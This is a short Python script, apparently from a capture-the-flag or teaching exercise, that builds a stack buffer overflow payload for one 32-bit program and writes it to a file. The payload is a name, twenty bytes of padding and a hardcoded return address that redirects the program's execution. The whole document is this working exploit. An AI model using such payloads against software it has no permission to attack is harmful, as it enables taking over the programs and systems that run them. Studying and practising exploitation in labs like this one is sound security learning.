return_address = b"\xab\x85\x04\x08" #  0x80485ab
fill = b"0"*5*4
name = b"Sai\n"

payload = name + fill + return_address
print (payload)
f = open("exploit_buffer_overflow_2.exp", "wb")
f.write(payload)
f.close()